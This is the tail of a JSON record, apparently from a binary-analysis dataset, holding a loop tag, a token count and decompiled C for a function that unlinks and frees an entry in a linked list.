            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407c35(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004069d0(0x7f7d70, 0xc);\n    fcn.00407f7e(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x7fab88;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x7fab84;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00407c79;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404d1b(arg_8h_00);\ncode_r0x00407c79:\n        fcn.00404d1b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00407c9c();\n    fcn.00406a15();\n    return;\n}\n",
        "token_count": 403
    }
}